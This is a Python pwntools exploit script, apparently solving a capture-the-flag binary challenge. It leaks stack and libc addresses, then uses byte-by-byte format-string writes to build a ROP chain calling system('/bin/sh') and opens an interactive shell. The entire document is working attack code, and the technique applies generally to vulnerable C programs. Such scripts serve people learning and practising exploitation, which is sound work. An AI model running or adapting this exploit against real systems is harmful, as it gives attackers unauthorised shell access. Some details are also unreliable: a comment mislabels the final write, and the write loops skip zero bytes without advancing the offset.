#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("challenge_patched")
libc = ELF("./libc.so.6")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
fgets_off = 0x7f380 # We can leak fgets addr with hint()
one_off = 0xebd43 # not working
pop_rdi_off = 0x2a3e5

# Functions
def leak():
    io.sendlineafter(b">> ", b"1")
    leak = io.recvline()
    stack = int(leak[:14], 16) # use int when we get the addresses in hex perfectly
    fgets = int(leak[15:29], 16)
    return stack, fgets


def writeb(offset, where, what, size):
    io.sendlineafter(b">> ", b"2")
    payload = fmtstr_payload(offset, {where:what}, write_size=size)
    io.sendlineafter(b">> ", payload)
    

io = start()

stack, fgets = leak()

log.info("Stack leak: %s" % hex(stack))
stack_base = stack - 0x20
log.info("Stack base: %s" % hex(stack_base))
log.info("Fgets: %s" % hex(fgets))
libc.address = fgets - fgets_off
log.info("Libc base: %s" % hex(libc.address))
pop_rdi_ret = libc.address + pop_rdi_off
log.info("pop rdi ret: %s" % hex(pop_rdi_ret))

target = stack_base + 0x58  # pop rdi ret __libc_start_call_main, %17 on the stack
target1 = stack_base + 0x60 # *binsh
target2 = stack_base + 0x68 # ret
target3 = stack_base + 0x70 # system


# use rop for automation
rop = ROP(libc)

pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0] # first elem in rop result is addr
ret = rop.find_gadget(["ret"])[0]
binsh = next(libc.search(b"/bin/sh")) # binsh found in the binary
system = libc.sym.system

offset = 6 # rsp is %6 on x86-64

# write pop rdi ret to target
i = 0
for elem in p64(pop_rdi_ret):
    if elem == 0:
        continue
    writeb(offset, target + i, elem, "byte")
    i += 1

# write *binsh to target1
i = 0
for elem in p64(binsh):
    if elem == 0:
        continue
    writeb(offset, target1 + i, elem, "byte")
    i += 1

# write ret to target2 for stack alignment
i = 0
for elem in p64(ret):
    if elem == 0:
        continue
    writeb(offset, target2 + i, elem, "byte")
    i += 1

# write ret to target3 for stack alignment
i = 0
for elem in p64(system):
    if elem == 0:
        continue
    writeb(offset, target3 + i, elem, "byte")
    i += 1
io.interactive()
